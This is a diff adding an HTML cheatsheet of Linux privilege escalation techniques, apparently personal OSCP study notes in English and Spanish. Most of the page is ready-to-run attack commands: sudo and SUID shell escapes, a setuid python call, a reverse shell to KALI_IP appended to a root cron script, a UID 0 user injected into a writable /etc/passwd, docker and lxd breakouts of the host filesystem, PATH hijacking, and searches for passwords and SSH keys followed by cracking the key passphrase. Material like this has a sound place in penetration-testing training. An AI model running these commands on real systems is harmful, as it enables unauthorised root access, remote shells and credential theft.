@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Linux Privilege Escalation - OSCP Notes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <nav>
+        <a href="index.html">Home</a>
+
+        <div class="dropdown">
+            <a href="#">AD ▾</a>
+            <div class="dropdown-content">
+                <a href="enumeration.html">Enumeration</a>
+                <a href="attacking.html">Attacking</a>
+                <a href="lateralMovement.html">Lateral Movement</a>
+                <a href="metodologie.html">Methodology</a>
+            </div>
+        </div>
+
+        <a href="windows_privesc.html">Windows PrivEsc</a>
+        <a href="linux-privesc.html">Linux Privesc</a>
+        <a href="file-transfer.html">File Transfer</a>
+        <a href="checklist.html">Checklist</a>
+    </nav>
+
+    <div class="container">
+
+        <h1>Linux Privilege Escalation Cheatsheet (OSCP Style)</h1>
+
+        <!-- 1 -->
+        <div class="section">
+            <div class="section-header">1. Basic Enumeration (Always First)</div>
+            <div class="section-content">
+
+                <pre><code>id
+whoami
+groups
+hostname
+uname -a
+uname -r
+arch
+cat /etc/issue
+cat /etc/os-release
+ps aux
+env
+</code></pre>
+
+                <p><strong>Qué buscas:</strong></p>
+                <ul>
+                    <li>Grupos interesantes (sudo, docker, lxd, adm)</li>
+                    <li>Versión del kernel vulnerable</li>
+                    <li>Servicios corriendo como root</li>
+                    <li>Variables de entorno sensibles</li>
+                </ul>
+
+            </div>
+        </div>
+
+        <!-- 2 -->
+        <div class="section">
+            <div class="section-header">2. SUDO Misconfiguration</div>
+            <div class="section-content">
+
+                <pre><code>sudo -l</code></pre>
+
+                <p>Busca comandos ejecutables como root sin contraseña.</p>
+
+                <p><strong>Ejemplos:</strong></p>
+
+                <pre><code>sudo find . -exec /bin/sh \; -quit
+sudo vim -c ':!/bin/sh'
+sudo less /etc/passwd
+! /bin/sh
+</code></pre>
+
+                <p>Consulta GTFOBins para abusar del binario permitido.</p>
+
+            </div>
+        </div>
+
+        <!-- 3 -->
+        <div class="section">
+            <div class="section-header">3. SUID Binaries</div>
+            <div class="section-content">
+
+                <pre><code>find / -perm -u=s -type f 2>/dev/null</code></pre>
+
+                <p>Busca binarios con bit SUID.</p>
+
+                <p><strong>Ejemplo:</strong></p>
+
+                <pre><code>find . -exec /bin/sh -p \; -quit
+</code></pre>
+
+                <p>La flag -p mantiene EUID=root.</p>
+
+            </div>
+        </div>
+
+        <!-- 4 -->
+        <div class="section">
+            <div class="section-header">4. Capabilities</div>
+            <div class="section-content">
+
+                <pre><code>getcap -r / 2>/dev/null</code></pre>
+
+                <p>Busca binarios con capabilities especiales.</p>
+
+                <p>Ejemplo peligroso:</p>
+
+                <pre><code>/usr/bin/python = cap_setuid+ep</code></pre>
+
+                <pre><code>python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+</code></pre>
+
+            </div>
+        </div>
+
+        <!-- 5 -->
+        <div class="section">
+            <div class="section-header">5. Cron Jobs</div>
+            <div class="section-content">
+
+                <pre><code>crontab -l
+ls -lah /etc/cron*
+cat /etc/crontab
+</code></pre>
+
+                <p>Busca scripts ejecutados como root con permisos write.</p>
+
+                <pre><code>echo "bash -i >& /dev/tcp/KALI_IP/4444 0>&1" >> script.sh
+</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">11. /etc/passwd Writable → Root Escalation</div>
+            <div class="section-content">
+
+                <h3>Concept</h3>
+                <ul>
+                    <li>Linux passwords normally stored in <strong>/etc/shadow</strong></li>
+                    <li>If hash exists in <strong>/etc/passwd</strong>, it overrides shadow</li>
+                    <li>If writable → we can inject a root user</li>
+                    <li>UID 0 = root privileges</li>
+                </ul>
+
+                <h3>Step 1 – Check Permissions</h3>
+
+                <pre><code>ls -l /etc/passwd
+</code></pre>
+
+                If you see:
+                <pre><code>-rw-rw-rw-</code></pre>
+
+                → World writable = vulnerable
+
+                <h3>Step 2 – Generate Password Hash</h3>
+
+                <pre><code>openssl passwd w00t
+</code></pre>
+
+                Example output:
+                <pre><code>Fdzt.eqJQ4s0g</code></pre>
+
+                <h3>Step 3 – Inject Root User</h3>
+
+                <pre><code>echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+</code></pre>
+
+                Format reminder:
+                <pre><code>username:hash:UID:GID:comment:home:shell</code></pre>
+
+                Critical fields:
+                <ul>
+                    <li>UID = 0</li>
+                    <li>GID = 0</li>
+                </ul>
+
+                <h3>Step 4 – Switch User</h3>
+
+                <pre><code>su root2
+Password: w00t
+
+id
+</code></pre>
+
+                Expected:
+                <pre><code>uid=0(root) gid=0(root)</code></pre>
+
+                <h3>Quick Exploit Flow</h3>
+
+                <pre><code>ls -l /etc/passwd
+openssl passwd newpass
+echo "pwn:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
+su pwn
+id
+</code></pre>
+
+                <h3>Why It Works</h3>
+
+                <ul>
+                    <li>/etc/passwd hash overrides shadow</li>
+                    <li>System trusts UID 0</li>
+                    <li>No shadow access needed</li>
+                </ul>
+
+                <h3>OSCP Mental Trigger</h3>
+
+                <p>
+                    If you see:
+                </p>
+
+                <pre><code>WARNING: /etc/passwd world writable</code></pre>
+
+                → Immediately think: <strong>Create UID 0 user</strong>
+
+            </div>
+        </div>
+
+        <!-- 6 -->
+        <div class="section">
+            <div class="section-header">6. Writable Files & Misconfigured Permissions</div>
+            <div class="section-content">
+
+                <pre><code>find / -writable -type d 2>/dev/null
+find / -writable -type f 2>/dev/null
+ls -la /etc/passwd
+</code></pre>
+
+                <p>Si /etc/passwd es escribible:</p>
+
+                <pre><code>openssl passwd newpass
+echo 'root2:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
+su root2
+</code></pre>
+
+            </div>
+        </div>
+
+        <!-- 7 -->
+        <div class="section">
+            <div class="section-header">7. Kernel Exploits</div>
+            <div class="section-content">
+
+                <pre><code>uname -r
+searchsploit linux kernel 4.4
+</code></pre>
+
+                <p>Transferir exploit:</p>
+
+                <pre><code>scp exploit.c user@TARGET:/tmp/
+gcc exploit.c -o exploit
+./exploit
+</code></pre>
+
+            </div>
+        </div>
+
+        <!-- 8 -->
+        <div class="section">
+            <div class="section-header">8. Docker / LXD Groups</div>
+            <div class="section-content">
+
+                <pre><code>id
+groups
+</code></pre>
+
+                <p>Si estás en docker:</p>
+
+                <pre><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</code></pre>
+
+                <p>Si estás en lxd:</p>
+
+                <pre><code>lxc init alpine privesc -c security.privileged=true
+lxc config device add privesc root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/sh
+</code></pre>
+
+            </div>
+        </div>
+
+        <!-- 9 -->
+        <div class="section">
+            <div class="section-header">9. PATH Hijacking</div>
+            <div class="section-content">
+
+                <pre><code>echo $PATH</code></pre>
+
+                Si un script root usa un comando sin ruta absoluta:
+
+                <pre><code>echo "/bin/bash" > fakebinary
+chmod +x fakebinary
+export PATH=/tmp:$PATH
+</code></pre>
+
+            </div>
+        </div>
+
+        <!-- 10 -->
+        <div class="section">
+            <div class="section-header">10. Password Hunting</div>
+            <div class="section-content">
+
+                <pre><code>grep -Ri "password" /home 2>/dev/null
+cat ~/.bash_history
+cat /var/www/html/config.php
+</code></pre>
+
+                Buscar claves privadas:
+
+                <pre><code>find / -name id_rsa 2>/dev/null
+</code></pre>
+<h3 class="sub-title">Using SSH Private Keys</h3>
+
+<p>If you find a private key (id_rsa, .pem, .key), follow this process:</p>
+
+<h4>1. Verify Key</h4>
+<pre><code>
+cat /home/user/.ssh/id_rsa
+</code></pre>
+
+<p>Look for:</p>
+<pre><code>-----BEGIN OPENSSH PRIVATE KEY-----</code></pre>
+
+<h4>2. Copy Key to Your Machine</h4>
+
+<p>Manual copy:</p>
+<pre><code>
+nano id_rsa
+</code></pre>
+
+<p>Paste key content and save.</p>
+
+<h4>3. Fix Permissions</h4>
+<pre><code>
+chmod 600 id_rsa
+</code></pre>
+
+<p><b>Important:</b> SSH will reject the key if permissions are too open.</p>
+
+<h4>4. Use the Key</h4>
+<pre><code>
+ssh -i id_rsa user@target
+</code></pre>
+
+<h4>5. If Passphrase is Required</h4>
+<pre><code>
+ssh2john id_rsa > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre>
+
+<h4>6. Post-Exploitation Checks</h4>
+<ul>
+    <li>Try different users with the same key</li>
+    <li>Try key on other machines (lateral movement)</li>
+    <li>Check authorized_keys files</li>
+</ul>
+
+<pre><code>
+cat ~/.ssh/authorized_keys
+</code></pre>
+
+<h4>OSCP Mental Trigger</h4>
+
+<p>If you see a private key → immediately think:</p>
+
+<pre><code>
+Copy → chmod 600 → ssh → crack if needed
+</code></pre>
+
+            </div>
+        </div>
+
+        <!-- SUMMARY -->
+        <div class="section">
+            <div class="section-header">OSCP Mental Flow</div>
+            <div class="section-content">
+
+                <ol>
+                    <li>id / groups</li>
+                    <li>sudo -l</li>
+                    <li>SUID</li>
+                    <li>Capabilities</li>
+                    <li>Cron jobs</li>
+                    <li>Writable files</li>
+                    <li>Docker / LXD</li>
+                    <li>Kernel exploit (last resort)</li>
+                </ol>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">Linux PrivEsc Practical Checklist</div>
+            <div class="section-content">
+
+                <form class="checklist">
+
+                    <h3>Initial Enumeration</h3>
+                    <label><input type="checkbox"> Ran id / groups</label><br>
+                    <label><input type="checkbox"> Checked kernel version (uname -r)</label><br>
+                    <label><input type="checkbox"> Identified OS version</label><br>
+                    <label><input type="checkbox"> Checked running processes</label><br>
+
+                    <h3>Sudo</h3>
+                    <label><input type="checkbox"> Executed sudo -l</label><br>
+                    <label><input type="checkbox"> Checked GTFOBins for allowed binaries</label><br>
+
+                    <h3>SUID & Capabilities</h3>
+                    <label><input type="checkbox"> Searched for SUID binaries</label><br>
+                    <label><input type="checkbox"> Checked unusual SUID binaries</label><br>
+                    <label><input type="checkbox"> Enumerated capabilities (getcap)</label><br>
+
+                    <h3>Cron Jobs</h3>
+                    <label><input type="checkbox"> Checked crontab</label><br>
+                    <label><input type="checkbox"> Reviewed /etc/cron*</label><br>
+                    <label><input type="checkbox"> Verified writable cron scripts</label><br>
+
+                    <h3>Writable Files</h3>
+                    <label><input type="checkbox"> Searched writable directories</label><br>
+                    <label><input type="checkbox"> Checked /etc/passwd permissions</label><br>
+                    <label><input type="checkbox"> Tested /etc/passwd UID 0 injection (if writable)</label><br>
+
+                    <h3>Containers & Groups</h3>
+                    <label><input type="checkbox"> Checked docker group</label><br>
+                    <label><input type="checkbox"> Checked lxd group</label><br>
+
+                    <h3>PATH & Environment</h3>
+                    <label><input type="checkbox"> Reviewed $PATH</label><br>
+                    <label><input type="checkbox"> Tested PATH hijacking possibility</label><br>
+
+                    <h3>Password Hunting</h3>
+                    <label><input type="checkbox"> Grepped for passwords</label><br>
+                    <label><input type="checkbox"> Checked bash history</label><br>
+                    <label><input type="checkbox"> Searched for SSH private keys</label><br>
+
+                    <h3>Final Step</h3>
+                    <label><input type="checkbox"> Checked kernel exploits (last resort)</label><br>
+                    <label><input type="checkbox"> Ran LinPEAS / Manual verification</label><br>
+
+                </form>
+
+            </div>
+        </div>
+
+
+    </div>
+
+    <script>
+        document.querySelectorAll(".section-header").forEach(h => {
+            h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+        })
+    </script>
+
+</body>
+
+</html>
